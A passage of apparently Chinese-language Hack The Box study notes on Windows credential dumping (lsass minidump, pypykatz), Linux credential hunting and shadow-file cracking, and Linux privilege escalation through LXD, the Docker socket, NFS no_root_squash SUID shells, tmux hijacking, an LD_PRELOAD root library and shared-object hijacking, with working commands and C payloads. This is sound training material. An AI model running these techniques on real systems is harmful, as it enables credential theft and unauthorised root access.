id="Creating-lsass-dmp-using-PowerShell"><a href="#Creating-lsass-dmp-using-PowerShell" class="headerlink" title="Creating lsass.dmp using PowerShell"></a>Creating lsass.dmp using PowerShell</h4><pre><code class="powershell-session">PS C:\Windows\system32&gt; rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full</code></pre><h2 id="Using-Pypykatz-to-Extract-Credentials"><a href="#Using-Pypykatz-to-Extract-Credentials" class="headerlink" title="Using Pypykatz to Extract Credentials"></a>Using Pypykatz to Extract Credentials</h2><p> <a href="https://github.com/skelsec/pypykatz">pypykatz</a></p><p>该命令启动使用pypykatz来解析LSASS进程内存转储中隐藏的机密。我们在命令中使用lsa，因为LSASS是本地安全机构的子系统，然后我们将数据源指定为小型转储文件，按照存储在攻击主机上的转储文件的路径（&#x2F;home&#x2F;peter&#x2F;Documents&#x2F;lass.dmp）进行。Pypykatz解析转储文件并输出结果：</p><pre><code class="shell-session">Tanin@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp </code></pre><p>一些有用的凭据：</p><p><a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package">MSV</a>是Windows中的一个身份验证包，LSA调用它来验证SAM数据库的登录尝试。Pypykatz提取了存储在LSASS进程内存中的与bob用户帐户的登录会话相关的SID、用户名、域，甚至NT&amp;SHA1密码哈希。这将在本节末尾介绍的我们进攻的最后阶段证明是有帮助的。</p><p>WDIGEST是一种较旧的身份验证协议，默认情况下在Windows XP-Windows 8和Windows Server 2003-Windows Server 2012中启用。LSASS以明文形式缓存WDIGEST使用的凭据。这意味着，如果我们发现自己的目标是启用WDIGEST的Windows系统，我们很可能会看到明文形式的密码。现代Windows操作系统默认情况下已禁用WDIGEST。此外，需要注意的是，Microsoft发布了针对受此问题影响的系统的WDIGEST安全更新。我们可以在这里 <a href="https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/">here</a>.研究安全更新的细节。</p><p><a href="https://web.mit.edu/kerberos/#what_is">Kerberos</a>是Active Directory在Windows域环境中使用的网络身份验证协议。域用户帐户在使用Active Directory进行身份验证时被授予票证。此票证用于允许用户访问网络上已被授予访问权限的共享资源，而无需每次键入凭据。LSASS缓存与Kerberos关联的密码、ekeys、票证和pin。可以从LSASS进程内存中提取这些，并使用它们访问加入同一域的其他系统。</p><p>&#x3D;&#x3D;数据保护应用程序编程接口（<a href="https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection">DPAPI</a> ）是Windows操作系统中的一组API，用于在每个用户的基础上为Windows操作系统功能和各种第三方应用程序加密和解密DPAPI数据块。&#x3D;&#x3D;</p><h1 id="Credential-Hunting-in-Linux"><a href="#Credential-Hunting-in-Linux" class="headerlink" title="Credential Hunting in Linux"></a>Credential Hunting in Linux</h1><h2 id="Files"><a href="#Files" class="headerlink" title="Files"></a>Files</h2><p>我们应该逐一查找、查找和检查几类文件。这些类别如下：</p><table><thead><tr><th>Configuration files</th><th>Databases</th><th>Notes</th></tr></thead><tbody><tr><td>Scripts</td><td>Cronjobs</td><td>SSH keys</td></tr></tbody></table><p>通常，配置文件标记有以下三个文件扩展名（.config、.conf、.cnf）。通过下面的方法，我们将看到我们的搜索减少到了这三个文件扩展名。</p><pre><code class="shell-session">cry0l1t3@unixclient:~$ for l in $(echo &quot;.conf .config .cnf&quot;);do echo -e &quot;\nFile extension: &quot; $l; find / -name *$l 2&gt;/dev/null | grep -v &quot;lib\|fonts\|share\|core&quot; ;done</code></pre><h4 id="Databases"><a href="#Databases" class="headerlink" title="Databases"></a>Databases</h4><pre><code class="shell-session">for l in $(echo &quot;.sql .db .*db .db*&quot;);do echo -e &quot;\nDB File extension: &quot; $l; find / -name *$l 2&gt;/dev/null | grep -v &quot;doc\|lib\|headers\|share\|man&quot;;done</code></pre><h4 id="Scripts"><a href="#Scripts" class="headerlink" title="Scripts"></a>Scripts</h4><pre><code class="shell-session">cry0l1t3@unixclient:~$ for l in $(echo &quot;.py .pyc .pl .go .jar .c .sh&quot;);do echo -e &quot;\nFile extension: &quot; $l; find / -name *$l 2&gt;/dev/null | grep -v &quot;doc\|lib\|headers\|share&quot;;done</code></pre><h4 id="SSH-Keys"><a href="#SSH-Keys" class="headerlink" title="SSH Keys"></a>SSH Keys</h4><p>SSH密钥可以被视为用于公钥身份验证机制的SSH协议的“访问卡”。为客户端生成一个文件（私钥），为服务器生成一个相应的文件（公钥）。然而，这些并不相同，因此知道公钥不足以找到私钥。公钥可以验证由专用SSH密钥生成的签名，从而能够自动登录到服务器。即使未经授权的人获得了公钥，也几乎不可能从中计算出匹配的私钥。当使用私钥SSH连接到服务器时，服务器会检查私钥是否有效，并让客户端相应登录。因此，通过SSH连接不再需要密码。 由于SSH密钥可以任意命名，因此我们无法在它们中搜索特定的名称。然而，它们的格式允许我们唯一地识别它们，因为无论是公钥还是私钥，都有唯一的第一行来区分它们。</p><pre><code class="shell-session">grep -rnw &quot;PRIVATE KEY&quot; /home/* 2&gt;/dev/null | grep &quot;:1&quot;</code></pre><blockquote><ul><li><code>-r</code>: 递归地搜索目录及其子目录下的文件。</li><li><code>-n</code>: 显示匹配行及其行号。</li><li><code>-w</code>: 仅匹配完整单词，而不是部分匹配。</li><li><code>&quot;PRIVATE KEY&quot;</code>: 要搜索的文本模式，即我们要找到包含的字符串。</li></ul></blockquote><h2 id="History"><a href="#History" class="headerlink" title="History"></a>History</h2><p>所有历史文件都提供了有关当前和过去&#x2F;历史过程的重要信息。我们对存储用户命令历史记录的文件和存储系统进程信息的日志感兴趣。 在使用Bash作为标准shell的Linux发行版上输入的命令的历史记录中，我们可以在.Bash_history中找到相关文件。然而，其他文件（如.bashrc或.Bash_profile）可能包含重要信息。 </p><h4 id="Bash-History"><a href="#Bash-History" class="headerlink" title="Bash History"></a>Bash History</h4><pre><code class="shell-session">tail -n5 /home/*/.bash*</code></pre><table><thead><tr><th><strong>Log File</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>/var/log/messages</code></td><td>Generic system activity logs.</td></tr><tr><td><code>/var/log/syslog</code></td><td>Generic system activity logs.</td></tr><tr><td><code>/var/log/auth.log</code></td><td>(Debian) All authentication related logs.</td></tr><tr><td><code>/var/log/secure</code></td><td>(RedHat&#x2F;CentOS) All authentication related logs.</td></tr><tr><td><code>/var/log/boot.log</code></td><td>Booting information.</td></tr><tr><td><code>/var/log/dmesg</code></td><td>Hardware and drivers related information and logs.</td></tr><tr><td><code>/var/log/kern.log</code></td><td>Kernel related warnings, errors and logs.</td></tr><tr><td><code>/var/log/faillog</code></td><td>Failed login attempts.</td></tr><tr><td><code>/var/log/cron</code></td><td>Information related to cron jobs.</td></tr><tr><td><code>/var/log/mail.log</code></td><td>All mail server related logs.</td></tr><tr><td><code>/var/log/httpd</code></td><td>All Apache related logs.</td></tr><tr><td><code>/var/log/mysqld.log</code></td><td>All MySQL server related logs.</td></tr></tbody></table><h2 id="Memory-and-Cache"><a href="#Memory-and-Cache" class="headerlink" title="Memory and Cache"></a>Memory and Cache</h2><p>有一个名为 <a href="https://github.com/huntergregal/mimipenguin">mimipenguin</a>的工具可以使整个过程变得更容易。但是，此工具需要管理员&#x2F;root权限</p><p>我们可以使用的一个更强大的工具是LaZagne</p><h1 id="Passwd-Shadow-amp-Opasswd"><a href="#Passwd-Shadow-amp-Opasswd" class="headerlink" title="Passwd, Shadow &amp; Opasswd"></a>Passwd, Shadow &amp; Opasswd</h1><h4 id="Passwd-Format"><a href="#Passwd-Format" class="headerlink" title="Passwd Format"></a>Passwd Format</h4><table><thead><tr><th><code>cry0l1t3</code></th><th><code>:</code></th><th><code>x</code></th><th><code>:</code></th><th><code>1000</code></th><th><code>:</code></th><th><code>1000</code></th><th><code>:</code></th><th><code>cry0l1t3,,,</code></th><th><code>:</code></th><th><code>/home/cry0l1t3</code></th><th><code>:</code></th><th><code>/bin/bash</code></th></tr></thead><tbody><tr><td>Login name</td><td></td><td>Password info</td><td></td><td>UID</td><td></td><td>GUID</td><td></td><td>Full name&#x2F;comments</td><td></td><td>Home directory</td><td></td><td></td></tr></tbody></table><h4 id="Shadow-Format"><a href="#Shadow-Format" class="headerlink" title="Shadow Format"></a>Shadow Format</h4><table><thead><tr><th><code>cry0l1t3</code></th><th><code>:</code></th><th><code>$6$wBRzy$...SNIP...x9cDWUxW1</code></th><th><code>:</code></th><th><code>18937</code></th><th><code>:</code></th><th><code>0</code></th><th><code>:</code></th><th><code>99999</code></th><th><code>:</code></th><th><code>7</code></th><th><code>:</code></th><th><code>:</code></th><th><code>:</code></th></tr></thead><tbody><tr><td>Username</td><td></td><td>Encrypted password</td><td></td><td>Last PW change</td><td></td><td>Min. PW age</td><td></td><td>Max. PW age</td><td></td><td>Warning period</td><td>Inactivity period</td><td>Expiration date</td><td></td></tr></tbody></table><h2 id="Cracking-Linux-Credentials"><a href="#Cracking-Linux-Credentials" class="headerlink" title="Cracking Linux Credentials"></a>Cracking Linux Credentials</h2><h4 id="Unshadow"><a href="#Unshadow" class="headerlink" title="Unshadow"></a>Unshadow</h4><p><code>unshadow</code>: 这是一个系统管理工具，用于合并 <code>/etc/passwd</code> 和 <code>/etc/shadow</code> 文件，并输出未加密的密码哈希值。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak Tanin@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak Tanin@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes</code></pre><h4 id="Hashcat-Cracking-Unshadowed-Hashes"><a href="#Hashcat-Cracking-Unshadowed-Hashes" class="headerlink" title="Hashcat - Cracking Unshadowed Hashes"></a>Hashcat - Cracking Unshadowed Hashes</h4>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux_Privilege_Escalation3</title>
      <link href="/2023/07/17/Linux-Privilege-Escalation3/"/>
      <url>/2023/07/17/Linux-Privilege-Escalation3/</url>
      
        <content type="html"><![CDATA[<h1 id="Containers"><a href="#Containers" class="headerlink" title="Containers"></a>Containers</h1><p>容器在操作系统级别操作，虚拟机在硬件级别操作。因此，容器共享一个操作系统，并将应用程序进程与系统的其他部分隔离开来，而经典的虚拟化允许多个操作系统在单个系统上同时运行。 隔离和虚拟化至关重要，因为它们有助于尽可能高效地管理资源和安全方面。例如，它们有助于监测系统中的错误，这些错误通常与新开发的应用程序无关。另一个例子是隔离通常需要root权限的进程。此类应用程序可以是web应用程序或API，必须与主机系统隔离，以防止升级到数据库。</p><span id="more"></span><h2 id="Linux-Containers"><a href="#Linux-Containers" class="headerlink" title="Linux Containers"></a>Linux Containers</h2><p>Linux容器（LXC）是一种操作系统级的虚拟化技术，它允许多个Linux系统通过拥有自己的进程但共享主机系统内核而在单个主机上彼此隔离运行。</p><h4 id="Linux-Daemon"><a href="#Linux-Daemon" class="headerlink" title="Linux Daemon"></a>Linux Daemon</h4><p><a href="https://github.com/lxc/lxd">LXD</a>在某些方面与之相似，但其设计目的是包含一个完整的操作系统。因此，它不是一个应用程序容器，而是一个系统容器。在我们可以使用此服务升级我们的权限之前，我们必须在lxc或lxd组中。</p><p>从现在开始，我们有几种方法可以利用LXC&#x2F;LXD。我们可以创建自己的容器并将其传输到目标系统，也可以使用现有的容器。不幸的是，管理员经常使用几乎没有安全性的模板。这种态度的后果是，我们已经有了可以自己用来对付这个系统的工具。</p><pre><code class="shell-session">container-user@nix02:~$ cd ContainerImagescontainer-user@nix02:~$ lsubuntu-template.tar.xz</code></pre><p>这样的模板通常没有密码，特别是如果它们是简单的测试环境。这些应该可以快速访问并且使用起来不复杂。对安全的关注将使整个启动过程复杂化，使其更加困难，从而大大减缓启动速度。如果我们有点幸运，并且系统上有这样一个容器，它可以被利用。为此，我们需要将此容器作为镜像导入。</p><pre><code class="shell-session">container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutempcontainer-user@nix02:~$ lxc image list</code></pre><p>在验证此映像已成功导入后，我们可以启动映像并通过指定容器的security.privileged标志和根路径对其进行配置。此标志将禁用允许我们对主机执行操作的所有隔离功能。</p><pre><code class="shell-session">container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=truecontainer-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true</code></pre><blockquote><ol><li><code>lxc init ubuntutemp privesc -c security.privileged=true</code><ul><li><code>lxc init</code>: 创建一个新的容器配置。</li><li><code>ubuntutemp</code>: 源容器的名称。在此命令中，<code>ubuntutemp</code> 是已存在的容器的名称，将作为基础来创建新的容器。</li><li><code>privesc</code>: 新容器的名称。在这里，<code>privesc</code> 是要创建的新容器的名称。</li><li><code>-c security.privileged=true</code>: 这个选项用于将新创建的容器标记为 “特权容器”，即赋予它在主机系统上访问某些特权功能的能力。</li></ul></li><li><code>lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true</code><ul><li><code>lxc config device add</code>: 向容器配置中添加设备。</li><li><code>privesc</code>: 容器的名称，这里是之前创建的名为 <code>privesc</code> 的容器。</li><li><code>host-root</code>: 新设备的名称，这里是自定义的名称，表示要添加到容器中的设备的名称。</li><li><code>disk</code>: 设备类型，这里是要添加的设备类型是磁盘。</li><li><code>source=/</code>: 设备的源路径，这里指定的是 <code>/</code>，表示要将主机系统的根目录挂载到容器中。</li><li><code>path=/mnt/root</code>: 设备的目标路径，这里指定的是 <code>/mnt/root</code>，表示将主机系统的根目录挂载到容器中的 <code>/mnt/root</code> 目录。</li><li><code>recursive=true</code>: 指定递归地挂载整个文件系统。</li></ul></li></ol></blockquote><p>完成后，我们可以启动容器并登录到其中。在容器中，我们可以转到指定的路径，以root身份访问主机系统的资源。</p><pre><code class="shell-session">container-user@nix02:~$ lxc start privesccontainer-user@nix02:~$ lxc exec privesc /bin/bashroot@nix02:~# ls -l /mnt/root</code></pre><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>要通过Docker获得root权限，我们登录的用户必须在Docker组中。这使他能够使用和控制Docker守护进程。</p><p>或者，Docker可能设置了SUID，或者我们在Sudoers文件中，这允许我们以root身份运行Docker。这三个选项都允许我们与Docker合作以提升我们的特权。 大多数主机都有直接的互联网连接，因为必须下载基本映像和容器。然而，出于安全原因，许多主机可能在夜间和工作时间以外与互联网断开连接。然而，如果这些主机位于网络中，例如，web服务器必须通过该网络，则仍然可以访问该网络。 要查看存在哪些镜像以及我们可以访问哪些镜像，我们可以使用以下命令：</p><h4 id="Linux-Docker"><a href="#Linux-Docker" class="headerlink" title="Linux Docker"></a>Linux Docker</h4><pre><code class="shell-session">docker-user@nix02:~$ docker image lsREPOSITORY                           TAG                 IMAGE ID       CREATED         SIZEubuntu                               20.04               20fffa419e3a   2 days ago    72.8MB</code></pre><h4 id="Docker-Socket"><a href="#Docker-Socket" class="headerlink" title="Docker Socket"></a>Docker Socket</h4><p>当Docker套接字是可写的时，也可能发生这种情况。通常这个套接字位于&#x2F;var&#x2F;run&#x2F;doker.sock.但是，可以理解的是，位置不同。因为基本上，这只能由root或docker组编写。如果我们作为不在这两个组中的用户，并且Docker套接字仍然具有可写的权限，那么我们仍然可以使用这种情况来升级我们的权限。</p><pre><code class="shell-session">docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bashroot@ubuntu:~# ls -l /mnt</code></pre><blockquote><p>该命令使用 Docker 在容器中运行 Ubuntu 镜像，并将宿主机根目录 <code>/</code> 挂载到容器内的 <code>/mnt</code> 目录，然后进入容器的 Bash shell。</p><p>解析该命令的各个部分：</p><ul><li><code>docker</code>：Docker 命令，用于管理容器和镜像。</li><li><code>-H unix:///var/run/docker.sock</code>：指定 Docker 的主机地址，这里是 Unix 域套接字地址，用于与 Docker 守护进程通信。</li><li><code>run</code>：Docker 命令，用于创建并运行一个新的容器。</li><li><code>-v /:/mnt</code>：指定容器的数据卷挂载，将宿主机根目录 <code>/</code> 挂载到容器内的 <code>/mnt</code> 目录。这样在容器中可以访问宿主机的整个文件系统。</li><li><code>--rm</code>：指定容器退出时自动删除容器。当容器退出后，自动清理容器的数据。</li><li><code>-it</code>：启用交互式模式并分配一个伪终端 (pseudo-TTY)。这样可以进入容器并与其交互。</li><li><code>ubuntu</code>：要运行的容器镜像，这里是 Ubuntu 镜像。</li><li><code>chroot /mnt bash</code>：在容器内运行的命令，这里是 <code>chroot</code> 命令切换根目录到 <code>/mnt</code> 目录，然后启动 Bash shell。</li></ul></blockquote><h1 id="Miscellaneous-Techniques"><a href="#Miscellaneous-Techniques" class="headerlink" title="Miscellaneous Techniques"></a>Miscellaneous Techniques</h1><h2 id="Weak-NFS-Privileges"><a href="#Weak-NFS-Privileges" class="headerlink" title="Weak NFS Privileges"></a>Weak NFS Privileges</h2><p>网络文件系统（NFS）允许用户通过Unix&#x2F;Linux系统上托管的网络访问共享文件或目录。NFS使用TCP&#x2F;UDP端口2049。任何可访问的装载都可以通过发出命令showmount-e远程列出，该命令列出NFS客户端的NFS服务器的导出列表（或文件系统的访问控制列表）。</p><pre><code class="shell-session">Tanin@htb[/htb]$ showmount -e 10.129.2.12Export list for 10.129.2.12:/tmp             */var/nfs/general *</code></pre><p>创建NFS卷时，可以设置各种选项： </p><p>root_squash： 如果root用户用于访问NFS共享，它将被更改为nfsnobody用户，这是一个没有特权的帐户。root用户创建和上传的任何文件都将归nfsnobody用户所有，这可以防止攻击者上传SUID位设置的二进制文件。</p><p> no_root_squash：作为本地根用户连接到共享的远程用户将能够作为根用户在NFS服务器上创建文件。这将允许创建具有SUID位集的恶意脚本&#x2F;程序。</p><pre><code class="shell-session">htb@NIX02:~$ cat /etc/exports# /etc/exports: the access control list for filesystems which may be exported#to NFS clients.  See exports(5).## Example for NFSv2 and NFSv3:# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)## Example for NFSv4:# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)#/var/nfs/general *(rw,no_root_squash)/tmp *(rw,no_root_squash)</code></pre><p>例如，我们可以创建一个SETUID二进制文件，使用本地根用户执行&#x2F;bin&#x2F;sh。然后，我们可以在本地装载&#x2F;tmp目录，将root拥有的二进制文件复制到NFS服务器，并设置SUID位。 首先，创建一个简单的二进制文件，在本地装载目录，复制它，并设置必要的权限。</p><pre><code class="shell-session">htb@NIX02:~$ cat shell.c #include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;int main(void)&#123;  setuid(0); setgid(0); system(&quot;/bin/bash&quot;);&#125;</code></pre><pre><code class="shell-session">htb@NIX02:/tmp$ gcc shell.c -o shell</code></pre><pre><code class="shell-session">root@Pwnbox:~$ sudo mount -t nfs 10.129.2.12:/tmp /mntroot@Pwnbox:~$ cp shell /mntroot@Pwnbox:~$ chmod u+s /mnt/shell</code></pre><pre><code class="shell-session">root@Pwnbox:~$ sudo mount -t nfs 10.129.2.12:/tmp /mntroot@Pwnbox:~$ cp shell /mntroot@Pwnbox:~$ chmod u+s /mnt/shell</code></pre><pre><code class="shell-session">htb@NIX02:/tmp$ ./shellroot@NIX02:/tmp# iduid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(htb)</code></pre><h2 id="Hijacking-Tmux-Sessions"><a href="#Hijacking-Tmux-Sessions" class="headerlink" title="Hijacking Tmux Sessions"></a>Hijacking Tmux Sessions</h2><p>诸如 <a href="https://en.wikipedia.org/wiki/Tmux">tmux</a>之类的终端多路复用器可以用于允许在单个控制台会话内访问多个终端会话。当不在tmux窗口中工作时，我们可以从会话分离，仍然保持它处于活动状态（即，运行nmap扫描）。由于许多原因，用户可能会让tmux进程以特权用户的身份运行，例如使用弱权限设置的root，并可能被劫持。这可以通过以下命令来完成，以创建新的共享会话并修改所有权。</p><pre><code class="shell-session">htb@NIX02:~$ tmux -S /shareds new -s debugsesshtb@NIX02:~$ chown root:devs /shareds</code></pre><blockquote><ol><li><p><code>tmux -S /shareds new -s debugsess</code>：这个命令用于创建一个新的 tmux 会话，并将会话的控制 socket（控制 socket 用于与会话通信）设置为 <code>/shareds</code> 目录下的 <code>debugsess</code> 文件。<code>tmux</code> 是一个终端复用工具，允许用户在单个终端窗口中创建多个会话，并在会话之间切换。</p></li><li><p><code>chown root:devs /shareds</code>：这个命令用于更改 <code>/shareds</code> 目录的所有者和所属组。<code>chown</code> 是 Linux 中用于修改文件或目录所有者和所属组的命令。在这里，将 <code>/shareds</code> 目录的所有者设置为 <code>root</code> 用户，所属组设置为 <code>devs</code> 组。</p></li><li><p>设置 <code>/shareds</code> 目录的所属组为 <code>devs</code> 组后，该目录的成员将具有与所有者 <code>root</code> 相同的访问权限。这是因为在 Linux 系统中，文件和目录的权限由三种身份来控制：所有者、所属组和其他用户。</p><p>在这种设置下，<code>root</code> 用户是 <code>/shareds</code> 目录的所有者，而 <code>devs</code> 组是该目录的所属组。Linux 文件系统中的文件和目录权限分为读取（r）、写入（w）和执行（x）权限，可以针对所有者、所属组和其他用户分别设置。</p><p>由于 <code>root</code> 是 <code>/shareds</code> 目录的所有者，因此 <code>root</code> 用户将拥有所有权限，即读取、写入和执行权限。</p><p>同时，由于 <code>devs</code> 组是 <code>/shareds</code> 目录的所属组，并且设置了 <code>chown root:devs /shareds</code>，因此 <code>devs</code> 组的成员将拥有与所有者 <code>root</code> 相同的权限。这意味着 <code>devs</code> 组的成员可以读取、写入和执行 <code>/shareds</code> 目录及其内部的文件。</p></li></ol></blockquote><p>如果我们可以危害dev组中的用户，我们可以连接到此会话并获得root访问权限。 检查是否有任何正在运行的tmux进程。</p><pre><code class="shell-session">htb@NIX02:~$  ps aux | grep tmuxroot      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess</code></pre><p>确认权限。</p><pre><code class="shell-session">htb@NIX02:~$ ls -la /shareds srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds</code></pre><pre><code class="shell-session">htb@NIX02:~$ iduid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)</code></pre><pre><code class="shell-session">htb@NIX02:~$ tmux -S /sharedsiduid=0(root) gid=0(root) groups=0(root)</code></pre><h1 id="Shared-Libraries"><a href="#Shared-Libraries" class="headerlink" title="Shared Libraries"></a>Shared Libraries</h1><p>Linux程序通常使用动态链接的共享对象库。库包含已编译的代码或其他数据，开发人员使用这些数据来避免在多个程序中重写相同的代码。Linux中存在两种类型的库：静态库（用.a文件扩展名表示）和动态链接的共享对象库（用.so文件扩展名指示）。编译程序时，静态库将成为程序的一部分，并且不能更改。但是，可以修改动态库来控制调用它们的程序的执行。 有多种方法可以指定动态库的位置，因此系统将知道在程序执行时在哪里查找它们。这包括编译程序时的-rpath或-rpath链接标志，使用环境变量LD_RUN_PATH或LD_LIBRARY_PATH，将库放置在&#x2F;lib或&#x2F;usr&#x2F;lib默认目录中，或在&#x2F;etc&#x2F;LD.so.conf配置文件中指定另一个包含库的目录。 此外，LD_PRELOAD环境变量可以在执行二进制文件之前加载库。该库中的函数优先于默认函数。二进制文件所需的共享对象可以使用ldd实用程序查看。</p><pre><code class="shell-session">htb_student@NIX02:~$ ldd /bin/ls    linux-vdso.so.1 =&gt;  (0x00007fff03bc7000)    libselinux.so.1 =&gt; /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)    libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)    libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)    /lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)    libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)</code></pre><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdlib.h&gt;void _init() &#123;unsetenv(&quot;LD_PRELOAD&quot;);setgid(0);setuid(0);system(&quot;/bin/bash&quot;);&#125;</code></pre><p>我们可以将其编译如下：</p><pre><code class="shell-session">htb_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles</code></pre><blockquote><ol><li><code>gcc</code>: GCC（GNU Compiler Collection）是一个流行的编译器套件，用于编译 C、C++ 等编程语言的源代码。</li><li><code>-fPIC</code>: 这个选项告诉编译器生成位置无关代码（Position Independent Code，PIC），这样编译的共享库可以在内存中的任意位置加载，有助于共享库在不同进程之间共享代码段。</li><li><code>-shared</code>: 这个选项告诉编译器生成共享库而不是可执行文件。</li><li><code>-o root.so</code>: 这个选项指定输出的文件名为 <code>root.so</code>，即编译生成的共享库的文件名。</li><li><code>root.c</code>: 这是输入的源代码文件名，这里假设 <code>root.c</code> 是包含共享库的 C 代码文件。</li><li><code>-nostartfiles</code>: 这个选项告诉编译器不使用标准启动文件，通常用于生成不依赖标准 C 库的共享库。</li></ol></blockquote><p>最后，我们可以使用以下命令升级权限。请确保指定恶意库文件的完整路径。</p><pre><code class="shell-session">htb_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so 【Privilege command】iduid=0(root) gid=0(root) groups=0(root)</code></pre><p>补充一下：</p><blockquote><p>查看系统中是否有命令使用了 <code>LD_PRELOAD</code> 可能比较复杂，因为 <code>LD_PRELOAD</code> 是一个环境变量，可以在各种脚本、配置文件或命令中设置，甚至在程序运行时通过 <code>dlopen()</code> 等函数动态加载共享库。</p><p>以下是一些可能使用 <code>LD_PRELOAD</code> 的常见命令或程序：</p><ol><li><p><code>ldd</code>: <code>ldd</code> 命令本身会使用 <code>LD_PRELOAD</code> 来查找程序所依赖的共享库。</p></li><li><p>动态链接的程序：那些使用动态链接的程序，如自己编写的程序、第三方程序或系统工具，可能在启动时使用了 <code>LD_PRELOAD</code> 来预加载共享库。</p></li><li><p>启动脚本或配置文件：有些应用程序的启动脚本或配置文件中可能设置了 <code>LD_PRELOAD</code> 环境变量。</p></li><li><p>调试工具：一些调试工具可能使用 <code>LD_PRELOAD</code> 来注入共享库，从而实现调试目标程序。</p></li><li><p>系统设置：在某些情况下，系统级别的设置或安全策略可能设置了全局的 <code>LD_PRELOAD</code>，从而影响所有程序的运行。</p></li></ol><p>要查找系统中所有使用了 <code>LD_PRELOAD</code> 的命令，您可以使用以下方法：</p><ol><li><p>使用 <code>grep</code> 命令：在系统目录和用户目录中查找包含 <code>LD_PRELOAD</code> 的文件。例如：</p><pre><code class="bash">grep -rnw &#39;/&#39; -e &quot;LD_PRELOAD&quot;</code></pre><p>这会在整个系统中递归地查找包含 <code>LD_PRELOAD</code> 的文件，并列出相应的行和文件名。</p></li><li><p>使用 <code>ps</code> 命令：查看当前正在运行的进程中是否有使用了 <code>LD_PRELOAD</code> 的程序。例如：</p><pre><code class="bash">ps -eo pid,args | grep &quot;LD_PRELOAD&quot;</code></pre><p>这会列出当前正在运行的进程中包含 <code>LD_PRELOAD</code> 的命令行。</p></li></ol><p>请注意，找到使用 <code>LD_PRELOAD</code> 的命令并不意味着它们一定是恶意的或具有安全风险的。某些合法的程序可能需要使用 <code>LD_PRELOAD</code> 来实现特定功能或调试需求。然而，在生产环境中，对于未知来源或未经验证的 <code>LD_PRELOAD</code> 设置需要谨慎处理，以确保系统安全。</p></blockquote><h1 id="Shared-Object-Hijacking"><a href="#Shared-Object-Hijacking" class="headerlink" title="Shared Object Hijacking"></a>Shared Object Hijacking</h1><p>正在开发的程序和二进制文件通常具有与其相关联的自定义库。请考虑以下SETUID二进制文件。</p><pre><code class="shell-session">htb_student@NIX02:~$ ls -la payroll-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll</code></pre><p>我们可以使用ldd来打印二进制或共享对象所需的共享对象。对于程序的每个依赖项，Ldd显示对象的位置和加载到内存中的十六进制地址。</p><pre><code class="shell-session">htb_student@NIX02:~$ ldd payrolllinux-vdso.so.1 =&gt;  (0x00007ffcb3133000)libshared.so =&gt; /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)</code></pre><p>我们看到一个名为libshared.so的非标准库被列为二进制文件的依赖项。如前所述，可以从自定义位置加载共享库。一个这样的设置是RUNPATH配置。此文件夹中的库优先于其他文件夹。这可以使用<a href="https://man7.org/linux/man-pages/man1/readelf.1.html">readelf</a> 实用程序进行检查。</p><pre><code class="shell-session">htb_student@NIX02:~$ readelf -d payroll  | grep PATH 0x000000000000001d (RUNPATH)            Library runpath: [/development]</code></pre><p>该配置允许从&#x2F;development文件夹加载库，该文件夹可由所有用户写入。此错误配置可通过在&#x2F;development中放置恶意库来利用，该库将优先于其他文件夹，因为首先检查此文件中的条目（在配置文件中存在其他文件夹之前）。</p><pre><code class="shell-session">htb_student@NIX02:~$ ls -la /development/total 8drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../</code></pre><p>在编译库之前，我们需要找到二进制调用的函数名。</p><pre><code class="shell-session">htb_student@NIX02:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so</code></pre><pre><code class="shell-session">htb_student@NIX02:~$ ldd payrolllinux-vdso.so.1 (0x00007ffd22bbc000)libshared.so =&gt; /development/libshared.so (0x00007f0c13112000)/lib64/ld-linux-x86-64.so.2 